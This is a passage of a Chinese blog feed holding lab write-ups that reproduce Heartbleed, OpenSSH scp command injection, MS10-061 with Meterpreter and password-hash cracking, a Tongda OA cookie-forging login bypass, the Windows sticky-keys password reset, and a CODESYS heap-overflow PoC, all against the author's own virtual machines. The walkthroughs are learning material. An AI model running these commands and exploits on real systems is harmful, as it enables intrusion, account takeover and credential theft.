href="https://www.hacksafe.net/vuls/3766.html">博客</a>在这里说得不太清楚，我以为安装好docker-compose后，配置文件只要足够它运行即可，所以就直接复制粘贴了菜鸟教程上给出的示例，虽然成功运行了，但是在攻击机用nmap扫描不到漏洞。我看了几篇其他的博客，都没有用到docker-compose，还以为是配置文件哪里出了问题，自己尝试着修改，但没有成功。后来终于找到了一篇使用docker-compose复现该漏洞的<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_29365787/article/details/107184484">博客</a>，才发现docker-compose运行的配置文件需要在Github<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/openssl/heartbleed">下载</a>。</p><p>下载完成后，找到<code>openssl/heartbleed</code>目录，执行以下命令，在后台创建服务。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">docker<span class="token operator">-</span>compose up <span class="token operator">-</span>d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>等待一段时间后，服务创建成功。</p><p>输入<code>docker ps</code>查看服务运行状态（第一行，漏洞存在于443端口）。</p><h2 id="5-攻击机扫描漏洞"><a href="#5-攻击机扫描漏洞" class="headerlink" title="5. 攻击机扫描漏洞"></a>5. 攻击机扫描漏洞</h2><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">nmap <span class="token operator">-</span><span class="token function">sV</span> <span class="token operator">-</span>p 443 <span class="token operator">--</span>script ssl<span class="token operator">-</span>heartbleed<span class="token punctuation">.</span>nse 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>227<span class="token punctuation">.</span>138<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到，靶机存在heartbleed漏洞。</p><h3 id="6-攻击"><a href="#6-攻击" class="headerlink" title="6. 攻击"></a>6. 攻击</h3><p>打开kali，<code>msfconsole</code>启动msf，扫描Heartbleed漏洞的相关模块。</p><p>使用攻击模块，并进行相关的配置（在这里只需要配置一下靶机IP）。</p><p>输入<code>run</code>开始攻击。</p><p>第一行的内容表示漏洞确实存在并可以利用，将<code>verbose</code>设置为<code>true</code>，再次攻击，显示整个过程以及leak出来的数据。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 心脏出血 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenSSH命令注入漏洞复现</title>
      <link href="2020/09/10/openssh-ming-ling-zhu-ru-lou-dong-fu-xian/"/>
      <url>2020/09/10/openssh-ming-ling-zhu-ru-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>OpenSSH是用于使用SSH协议进行远程登录的一个开源实现。通过对交互的流量进行加密防止窃听，连接劫持以及其他攻击。OpenSSH由OpenBSD项目的一些开发人员开发， 并以BSD样式的许可证提供，且已被集成到许多商业产品中。</p><p>2020年6月9日，研究人员Chinmay Pandya在Openssh中发现了一个漏洞，于7月18日公开。OpenSSH的8.3p1中的scp允许在scp.c远程功能中注入命令，攻击者可利用该漏洞执行任意命令。目前绝大多数linux系统受影响。</p><p>本实验为我在实验室学习渗透测试所做的第九个漏洞复现，该漏洞发布时间较短，复现也十分简单，但漏洞等级却为高危。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>攻击机：Kali Linux</p><p>靶机：Centos7（OpenSSH_7.4p1）</p><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><h3 id="1-查看靶机OpenSSH版本号与靶机IP"><a href="#1-查看靶机OpenSSH版本号与靶机IP" class="headerlink" title="1. 查看靶机OpenSSH版本号与靶机IP"></a>1. 查看靶机OpenSSH版本号与靶机IP</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ssh</span> -V <span class="token comment"># 漏洞影响的版本为OpenSSH &lt;= 8.3p1</span><span class="token function">ip</span> a <span class="token comment"># 192.168.227.136</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="2-使用scp传送文件"><a href="#2-使用scp传送文件" class="headerlink" title="2. 使用scp传送文件"></a>2. 使用<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-scp.html">scp</a>传送文件</h3><p>在攻击机某个位置创建一个test.txt文件（为空即可），使用scp命令将该文件传送至靶机的tmp文件夹下，并且执行<code>touch /tmp/test.sh</code>命令，在靶机上创建一个test.sh文件。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">scp</span> file_name remote_username@remote_ip:<span class="token string">'<span class="token variable"><span class="token variable">`</span>注入命令<span class="token variable">`</span></span> /file_path'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后需要输入靶机的密码，输入完成后，文件即传送过去了，可以在靶机查看。</p><p>如图，新增了test.sh和test.txt两个文件。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ms10-061漏洞复现</title>
      <link href="2020/09/07/ms10-061-lou-dong-fu-xian/"/>
      <url>2020/09/07/ms10-061-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>本实验是我在实验室学习渗透测试所做的第八个漏洞复现，时间较之前几个略长，主要是内容多了一点，以及需要用到的Helix在网上找不到下载链接，最后是在vmware的一个论坛上找到别人给的一个镜像网站，顶着二十几k的速度下了一晚上下完了。我将文件重新进行了上传，读者可自行选择是直链下载还是保存到百度网盘后下载。</p><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Windows打印后台程序没有充分限制访问该服务的用户权限，攻击者可以通过提交特制的打印请求在windows系统目录(%SystemRoot%\system32)中创建文件。</p><p>攻击者可指定任意文件名，包括目录遍历，通过发送WritePrinter请求，攻击者可以完全控制创建文件的内容。</p><p>将文件写入到windows系统目录后，通过WMI来部署恶意程序，因为系统会自动运行%SYstemRoot%\System32\Wbem\MOF文件夹的mof文件、执行命令。</p><p>该漏洞首次被发现并应用于著名的Stuxnet蠕虫。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>攻击机：Kali Linux虚拟机</p><p>靶机：Windows xp sp3虚拟机</p><h2 id="靶机环境配置"><a href="#靶机环境配置" class="headerlink" title="靶机环境配置"></a>靶机环境配置</h2><h3 id="1-获取靶机IP"><a href="#1-获取靶机IP" class="headerlink" title="1. 获取靶机IP"></a>1. 获取靶机IP</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">ipconfig<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-创建共享打印"><a href="#2-创建共享打印" class="headerlink" title="2. 创建共享打印"></a>2. 创建共享打印</h3><p>打开控制面板，找到“打印机和传真”，双击打开后，右键选择“添加打印机”。有几个地方的配置可能需要修改一下：</p><p>后面还需要选择打印机厂商和型号，这个随便选择即可，名字也可以随意。不需要打印测试页。</p><p>完成后，右键新建的打印机，选择“共享”，点击下方的蓝字，不需要使用向导。</p><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h3 id="1-nmap扫描靶机"><a href="#1-nmap扫描靶机" class="headerlink" title="1. nmap扫描靶机"></a>1. nmap扫描靶机</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -sS -sU -O -p137-139,445 靶机IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>根据结果可知，靶机存在NetBIOS和RPC服务（139，445）。</p><h3 id="2-查找NetBIOS名称"><a href="#2-查找NetBIOS名称" class="headerlink" title="2. 查找NetBIOS名称"></a>2. 查找NetBIOS名称</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmblookup -A 靶机IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>NetBIOS工作站名字：ALLEYN-DBDD2110</p><p>NetBIOS组名：WORKGROUP</p><p>Master Browser： _MSBROWSE_</p><p>第二列解释（NetBIOS后缀）可以参考<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/NetBIOS%E5%8D%8F%E8%AE%AE">百度百科：NetBIOS协议</a>。</p><p>第四列为节点类型：</p><table><thead><tr><th>节点类型</th><th>含义</th></tr></thead><tbody><tr><td>B</td><td>0x01 Broadcast</td></tr><tr><td>P</td><td>0x02 Peer（WINS only）</td></tr><tr><td>M</td><td>0x04 Mixed（broadcast，then WINS）</td></tr><tr><td>H</td><td>0x08 Hybrid（WINS，then broadcast）</td></tr></tbody></table><h3 id="3-访问SMB资源"><a href="#3-访问SMB资源" class="headerlink" title="3. 访问SMB资源"></a>3. 访问SMB资源</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">smbclient -L <span class="token punctuation">\</span><span class="token punctuation">\</span>NetBIOS工作站名字 -I 靶机IP -N<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果提示<code>protocol negotiation failed: NT_STATUS_IO_TIMEOUT</code>，就修改/etc/samba/smb.conf，在[global]下添加两行：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">client min protocol <span class="token operator">=</span> COREclient max protocol <span class="token operator">=</span> SMB3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>正常情况下的返回结果如图，可以查看到我们之前在靶机创建的MyPrinter。</p><h3 id="4-使用MSF进行攻击"><a href="#4-使用MSF进行攻击" class="headerlink" title="4. 使用MSF进行攻击"></a>4. 使用MSF进行攻击</h3><p>启动msfconsole，载入模块，查看需要配置的参数。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfconsoleuse exploit/windows/smb/ms10_061_spoolssshow options<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>之后配置各项参数。</p><p>设置payload参数并配置。</p><p>开始攻击，如果攻击成功，会出现下面的提示。</p><p>恶意程序被写入到靶机的<code>%SystemRoot%\system32\cMityUuf3mMo72.exe</code>，此程序运行后反弹一个shell给kali，从而建立了一个Meterpreter会话。该恶意程序是通过<code>%SystemRoot%\system32\wbem\mof\WSsM5g8MoL5KHr.mof</code>控制运行的。</p><h3 id="5-验证操作"><a href="#5-验证操作" class="headerlink" title="5. 验证操作"></a>5. 验证操作</h3><p>可以看到我们已经获取了系统的system权限，``getpid<code>也得到了当前Meterpreter会话的进程ID。执行</code>shell`后可以直接进入靶机的命令行界面。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 查看该PID的相关进程，可以看到刚才写入的恶意程序</span>tasklist /v /fi <span class="token string">"PID eq "</span>进程ID<span class="token string">"# 查找该PID关联的网络链接netstat -nao | findstr "</span>进程ID"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="信息收集取证"><a href="#信息收集取证" class="headerlink" title="信息收集取证"></a>信息收集取证</h2><h3 id="1-进行基本的信息收集取证"><a href="#1-进行基本的信息收集取证" class="headerlink" title="1. 进行基本的信息收集取证"></a>1. 进行基本的信息收集取证</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 进程信息收集</span>tasklist <span class="token operator">&gt;</span> forensics_tasklist.txt<span class="token comment"># 网络信息收集</span><span class="token function">netstat</span> -ano <span class="token operator">&gt;</span> forensics_netstat.txt<span class="token comment"># 目录文件信息收集</span><span class="token function">dir</span> <span class="token operator">&gt;</span> dir_forensics.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>收集完成后，退出shell。</p><h3 id="2-获取SAM数据库信息"><a href="#2-获取SAM数据库信息" class="headerlink" title="2. 获取SAM数据库信息"></a>2. 获取SAM数据库信息</h3><p>输入<code>hashdump</code>获取SAM数据库，将获取到的信息复制到一个文本文件。</p><h3 id="3-建立远程取证收集环境"><a href="#3-建立远程取证收集环境" class="headerlink" title="3. 建立远程取证收集环境"></a>3. 建立远程取证收集环境</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">nc</span> -lvvvp <span class="token number">7777</span> <span class="token operator">&gt;</span> ms10_061.dd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-收集受害者内存信息"><a href="#4-收集受害者内存信息" class="headerlink" title="4. 收集受害者内存信息"></a>4. 收集受害者内存信息</h3><blockquote><p>Helix下载地址：</p><ol><li><p>百度网盘</p><p>链接：<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1H19CAdqTOrhvOssfqxMVrA">https://pan.baidu.com/s/1H19CAdqTOrhvOssfqxMVrA</a> </p><p>提取码：r16d</p></li><li><p>由onedrive转换生成的直链（推荐，但由于我也是第一次用这个，如果出什么问题的话请告知）：</p><p><a target="_blank" rel="noopener" href="https://onedrive.gimhoy.com/sharepoint/aHR0cHM6Ly9xaWFjdS1teS5zaGFyZXBvaW50LmNuLzp1Oi9nL3BlcnNvbmFsL3FpYWN1X3FpYWN1X3BhcnRuZXJfb25tc2NoaW5hX2NuL0VaNHlSdjJlNG5kTmx6djJ2YmpTQ3NrQi05cXduLVhHNTlZSlhtR2RNc0FPMkE/ZT15VTRwc2M=.iso">点击此处</a></p></li><li><p>镜像网站（国内速度特别慢）</p><p><a target="_blank" rel="noopener" href="http://ftp.cc.uoc.gr/mirrors/linux/helix/">点击此处</a></p></li></ol></blockquote><p>下载Helix 2008R1，下载完成后为一个iso文件，把它挂载在windows虚拟机上，然后在虚拟机中挂载并打开。</p><p>进行如下配置后，点击“Acquire”，出现弹窗后点击“Yes”。“Destination IP”为攻击机IP。</p><p>等待内存信息收集完成，完成后会自动关闭此cmd窗口。</p><p>收集完成后，回到kali，对7777端口的监听也自动结束了，<code>ls -lh</code>查看收集到的文件，共1.6G。</p><h3 id="5-收集其他取证文件"><a href="#5-收集其他取证文件" class="headerlink" title="5. 收集其他取证文件"></a>5. 收集其他取证文件</h3><p>下载之前收集的进程信息、网络信息和恶意程序。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">download C:<span class="token punctuation">\</span><span class="token punctuation">\</span>WINDOWS<span class="token punctuation">\</span><span class="token punctuation">\</span>system32<span class="token punctuation">\</span><span class="token punctuation">\</span>forensics_tasklist.txt 下载目录download C:<span class="token punctuation">\</span><span class="token punctuation">\</span>WINDOWS<span class="token punctuation">\</span><span class="token punctuation">\</span>system32<span class="token punctuation">\</span><span class="token punctuation">\</span>forensics_netstat.txt 下载目录download C:<span class="token punctuation">\</span><span class="token punctuation">\</span>WINDOWS<span class="token punctuation">\</span><span class="token punctuation">\</span>system32<span class="token punctuation">\</span><span class="token punctuation">\</span>dir_forensics.txt 下载目录download C:<span class="token punctuation">\</span><span class="token punctuation">\</span>WINDOWS<span class="token punctuation">\</span><span class="token punctuation">\</span>system32<span class="token punctuation">\</span><span class="token punctuation">\</span>恶意程序名称 下载目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>下载完成后可以在对应的目录下看到收集到的文件。</p><h3 id="6-使用John破解密码"><a href="#6-使用John破解密码" class="headerlink" title="6. 使用John破解密码"></a>6. 使用John破解密码</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">cp</span> ./samhash.txt<span class="token function">grep</span> -i admin samhash.txt <span class="token operator">&gt;</span> adminhash.txtjohn --format<span class="token operator">=</span>nt adminhash.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>正常情况下，会在<code>(Administrator)</code>前面显示管理员密码，由于我没有设置密码，所以这里为空。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a target="_blank" rel="noopener" href="https://juejin.im/post/6844903782644449293#heading-20">Metasploit:MS10-061: 入侵、提权和取证</a></li><li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45527786/article/details/105616570?depth_1-">https://blog.csdn.net/weixin_45527786/article/details/105616570?depth_1-</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远程代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通达OA任意用户登录漏洞复现</title>
      <link href="2020/08/31/tong-da-oa-ren-yi-yong-hu-deng-lu-lou-dong-fu-xian/"/>
      <url>2020/08/31/tong-da-oa-ren-yi-yong-hu-deng-lu-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>这是我在实验室学习渗透测试所做的第七个漏洞复现，由于最开始借鉴的博客叙述不太详细，走了一些弯路，再加上不太熟悉Burp Suite的操作，最开始还尝试了Wireshark和Postman，所以用了一天才做完。</p><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>通达OA是一套国内常用的办公系统，在V11.X&lt;V11.5和通达OA 2017版本中存在任意用户登录漏洞。攻击者在远程且未经授权的情况下，通过此漏洞可以以任意用户身份登录到系统（包括系统管理员）。复现此漏洞可以使用已有的POC脚本，也可以手工复现。</p><h2 id="实验工具与环境"><a href="#实验工具与环境" class="headerlink" title="实验工具与环境"></a>实验工具与环境</h2><p>实验工具：通达OA2017 v10.13.18，Burp Suite</p><p>实验环境：Windows 10</p><h2 id="利用POC复现"><a href="#利用POC复现" class="headerlink" title="利用POC复现"></a>利用POC复现</h2><h3 id="1-工具安装配置"><a href="#1-工具安装配置" class="headerlink" title="1. 工具安装配置"></a>1. 工具安装配置</h3><p>下载好通达OA2017后安装，所有选项默认即可。</p><h3 id="2-登录"><a href="#2-登录" class="headerlink" title="2. 登录"></a>2. 登录</h3><p>初始用户名：admin，密码为空，直接登录。</p><p>登录后，可以发现管理员后台地址都为如下格式：</p><pre class="line-numbers language-none"><code class="language-none">http://网站/general/index.php?isIE=0&amp;modify_pwd=0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>复制该地址，关闭网页，清除掉该网页的cookie，之后再次直接访问该地址，可以看到此时提示我们用户未登录。</p><h3 id="3-生成并替换cookie"><a href="#3-生成并替换cookie" class="headerlink" title="3. 生成并替换cookie"></a>3. 生成并替换cookie</h3><p>下载<a target="_blank" rel="noopener" href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User">poc</a>，在命令行中通过该poc生成我们的cookie，即<code>COOKIE:</code>后分号前的一段字符串。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python POC.py -v <span class="token number">11</span> -u http://本机IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>复制该字符串，在刚才的网页打开F12进行cookie的替换。点击<strong>应用程序</strong>，找到cookie，选择本地地址，将<code>PHPSESSID</code>的值替换成刚才生成的cookie。</p><p>替换后刷新页面，可以看到已经进入了登录成功的界面。这说明，已经成功利用cookie登录了进来。</p><h2 id="手工复现"><a href="#手工复现" class="headerlink" title="手工复现"></a>手工复现</h2><h3 id="1-抓包"><a href="#1-抓包" class="headerlink" title="1. 抓包"></a>1. 抓包</h3><p>使用Burp Suite抓包：在Proxy一栏下，选择Intercept，首先点击“Open Browser”打开内置浏览器（谷歌），然后在“Intercept is off”状态下打开<a target="_blank" rel="noopener" href="http://localhost/">http://localhost</a>，然后使“Intercept is on”，在账号密码均为空的情况下点击登录，此时能看到已经抓取到了我们需要的包。</p><h3 id="2-修改请求"><a href="#2-修改请求" class="headerlink" title="2. 修改请求"></a>2. 修改请求</h3><p>点击“Action–&gt;Send to Repeater”，然后就可以在Repeater一栏下看到这个包。点击左上角的Send后，会在右侧的Response下看到服务器的返回结果。如果状态码是200，说明成功了。</p><p>然后修改几个地方：</p><ul><li>首行的地址改为<code>/logincheck_code.php</code></li><li>删除Cookie一行</li><li>尾行最后加上<code>&amp;UID=1</code></li></ul><p>修改好后，再次发送，在Response中可以找到Set-Cookie，后面即为我们需要替换的cookie。</p><h3 id="3-验证"><a href="#3-验证" class="headerlink" title="3. 验证"></a>3. 验证</h3><p>清除Cookie，直接打开前面提到的链接，还是提示用户未登录，按F12，替换cookie后刷新页面，登录成功。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul><li><a target="_blank" rel="noopener" href="https://www.wjlshare.xyz/2020/05/03/%E9%80%9A%E8%BE%BEoa%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E9%99%86%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">通达OA任意用户登陆漏洞复现 - 天下大木头</a></li><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Rain99-/p/12762755.html">通达oa获取任意用户session登录复现 - 雨九九</a></li><li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mihoutao/p/11690432.html">Burp Suite抓包使用步骤 - 金龟子大战猕猴桃</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 任意用户登录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows五次Shift漏洞破解账户密码</title>
      <link href="2020/08/29/windows-wu-ci-shift-lou-dong-po-jie-zhang-hu-mi-ma/"/>
      <url>2020/08/29/windows-wu-ci-shift-lou-dong-po-jie-zhang-hu-mi-ma/</url>
      
        <content type="html"><![CDATA[<p>在B站上看到了一个关于Windows五次shift的视频，觉得很有意思，就像拿来复现一下试试。原视频是在Window7虚拟机上进行的，由于现在基本上都已经用Win10了，我就想win10会不会还存在这个漏洞呢，但理想很丰满，现实很骨感，我的windows10 2004版本的虚拟机并没有找到能利用这个漏洞的地方，只好再次换成win7 Ultimate sp1 64位虚拟机尝试。</p><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>此漏洞利用windows启动恢复功能，篡改系统文件名，从而可以利用命令行来清除用户密码或新建用户，以及更多事情。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="1-给账户设置密码"><a href="#1-给账户设置密码" class="headerlink" title="1. 给账户设置密码"></a>1. 给账户设置密码</h3><p>这个不必多说，我们是为了绕过密码，肯定需要密码的。</p><h3 id="2-查看本机是否具有此漏洞"><a href="#2-查看本机是否具有此漏洞" class="headerlink" title="2. 查看本机是否具有此漏洞"></a>2. 查看本机是否具有此漏洞</h3><p>在用户登录界面连按五下shift键，出现该弹框，说明该漏洞存在。仔细看一下弹窗左上角的那个蓝色图标，把它刻在脑子里，一会儿我们需要用到这个东西。</p><h3 id="3-进入启动恢复"><a href="#3-进入启动恢复" class="headerlink" title="3. 进入启动恢复"></a>3. 进入启动恢复</h3><p>重新启动虚拟机（或电脑），在出现windows图标时再次重新启动，选择“启动启动恢复”。如果这里你的界面和截图不一样的话，试着再次重启。</p><p>之后会有个弹窗，问您是否想使用“系统还原”还原计算机，这里选择取消。然后就是漫长的等待。当Windows终于发现自己无法自动修复此计算机时，它会出现一个弹窗，问你是否发送有关此问题的信息，这里直接点击左下角的那个小箭头，然后把文本框拉到最下面，点击最下面的那个链接，这个是本地的文件。</p><h3 id="4-张冠李戴"><a href="#4-张冠李戴" class="headerlink" title="4. 张冠李戴"></a>4. 张冠李戴</h3><p>打开txt文档后，点击“文件–&gt;打开”，进入C盘的Windows/System32，在“文本类型”一栏选择“所有文件”。</p><p>找到sethc文件，注意图标，和最开始让记住的那个图标一样。找到后，重命名，只要不和原来的相同，其他的都可以。</p><p>在同一目录下寻找cmd文件，找到后复制粘贴生成一个副本，将该副本改名为sethc。</p><p>重命名完成后，即可点击取消，然后关闭所有的窗口，重新启动电脑。出现登录界面时，按五次shift，这时你就会发现，原本应该出现的弹窗不见了（当然，如果你是虚拟机且原系统为windows的话，还是会在本机出现这个弹窗的），取而代之的是命令行窗口，可以看到窗口的名字为sethc。这是因为当我们按下五次shift后，系统会去我们刚才进入过的目录寻找名字为sethc的文件并调用，调用的结果就是出现弹窗。但我们将原来的sethc文件重命名了，并新创建了一个sethc，那么系统就会调用我们新创建的这个文件，即命令行窗口。</p><h3 id="5-清除密码"><a href="#5-清除密码" class="headerlink" title="5. 清除密码"></a>5. 清除密码</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">net user 用户名 <span class="token string">""</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>上面这条命令将会清楚掉对应用户名的密码，在登录界面，用户名对我们是可知的。清除密码后，下次我们重新启动电脑就会跳过登录环节，直接进入我们的桌面了。</p><p><img src="Windows%E4%BA%94%E6%AC%A1Shift%E6%BC%8F%E6%B4%9E%E7%A0%B4%E8%A7%A3%E8%B4%A6%E6%88%B7%E5%AF%86%E7%A0%81/008.png"></p><p>最后的最后，为了避免以后发生不必要的错误，最好还是再进入我们前面说过的目录，将文件名修改回原来的状态。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CODESYS V3远程堆溢出漏洞复现</title>
      <link href="2020/08/28/codesys-v3-lou-dong-fu-xian/"/>
      <url>2020/08/28/codesys-v3-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>这是我在实验室学习渗透测试的第六个漏洞复现，耗费时间有些长，至今不知道哪里出了问题，又是怎样稀里糊涂没有的（也可能很早就成功了，但是我没有注意到，一直纠结于网页打不开的问题）。不管怎么说，最后还是做出来了，以此文记录。</p><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>2020年3月25日CODESYS发布CODESYS V3未经身份验证的远程堆溢出漏洞，攻击者利用精心设计的请求可能会导致基于堆的缓冲区溢出。该漏洞存在于CmpWebServerHandlerV3.dll（文件版本3.5.15.20）库中，源于该dll库未能正确验证由用户提交的发往Web Server URL端点的数据。此漏洞会造成Web 服务器崩溃、拒绝服务或者可能被用于远程代码执行。</p><p>漏洞原理可参考<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/B3t7S3rud3ngkCWaygXt5w">本文</a>。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>靶机：Windows 10 x64</p><p>攻击机：Kali Linux</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="1-安装CODESYS-V3-5"><a href="#1-安装CODESYS-V3-5" class="headerlink" title="1. 安装CODESYS V3.5"></a>1. 安装CODESYS V3.5</h3><p>安装地址：<a target="_blank" rel="noopener" href="https://store.codesys.com/ftp_download/3S/CODESYS/300000/3.5.15.20/CODESYS%203.5.15.20.exe">https://store.codesys.com/ftp_download/3S/CODESYS/300000/3.5.15.20/CODESYS%203.5.15.20.exe</a>。因为有墙，会很慢，自己尝试特殊方式吧，注意，一定要安装32位的。该漏洞在3.5.15.40版本之前都存在。</p><h3 id="2-环境配置"><a href="#2-环境配置" class="headerlink" title="2. 环境配置"></a>2. 环境配置</h3><p>新建一个工程，名字为test。</p><p>进入“此电脑–&gt;管理–&gt;服务和应用程序–&gt;服务”，启动图中的服务。</p><p>双击左侧栏中的Device配置网关。在主界面的“扫描网络”一栏中点击右侧的计算机名后，回车，系统将自动扫描并激活节点。</p><p>右键左侧的Application，在“添加对象”一栏中找到“视图管理器”，激活WsuSymbols，然后打开。</p><p>打开后，可以对各参数进行配置。</p><p>继续进行视图添加（名字默认即可）。</p><p>点击右下角的“可视化工具箱”，可以在此处选择各种图标、组件，进行各种参数的配置。这里随便选一个即可。</p><p>在主菜单栏中选择“编译–&gt;重新编译”，对所有的代码进行编译，没有报错即可。然后找到上面中间位置的“Application [Device: PLC逻辑]”，点击右侧相邻的按键（或者直接快捷键Alt+F8）。下载。然后到了这个界面。</p><p>点击“启动”（快捷键F5）。运行成功后，就可以看到组态的界面了。</p><p>打开命令行，输入<code>netstat -ano</code>，可以看到TCP Port 8080端口已经成功开启（为漏洞利用对应的业务端口）。</p><p>环境配置至此已结束，下面已经可以开始漏洞复现了。</p><h3 id="3-漏洞复现"><a href="#3-漏洞复现" class="headerlink" title="3. 漏洞复现"></a>3. 漏洞复现</h3><p>开启攻击机（最开始我想在本机win10上试一下，但是一直打不开网页，后来换了kali才可以），打开192.168.227.133:8080/webvisu.htm（即靶机IP:8080/webvisu.htm），在我这里无法正常访问，但不影响后续过程。</p><p>然后，下载POC<a target="_blank" rel="noopener" href="https://github.com/tenable/poc/blob/master/codesys/codesys_v3_webserver_int32_overflow_tra_2020_16.py">代码</a>，放在合适的位置。</p><p>在运行代码前，先回到Windows端重启CODESYS服务，使CmpWebServerHandlerV3组件处于状态“0”，然后再运行POC脚本。格式为：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python PocName.py 靶机IP 端口号<span class="token punctuation">(</span>默认为8080<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行后，返回200，然后会报错，这是正常现象。若出现一堆A，说明攻击失败，需要查看前序步骤有无错误。</p><p>回到靶机查看服务，尽管“状态”一列显示为“正在运行”，但右键后发现服务已经关闭，说明攻击成功。服务在重启后可以正常访问。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>[1] <a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/B3t7S3rud3ngkCWaygXt5w">https://mp.weixin.qq.com/s/B3t7S3rud3ngkCWaygXt5w</a></p><p>[2] <a target="_blank" rel="noopener" href="https://www.freebuf.com/company-information/234023.html">https://www.freebuf.com/company-information/234023.html</a></p><p>最后，再心疼一下我可怜的内存…等我有钱了一定要换！！！</p>]]></content>
      
      
      <categories>
          
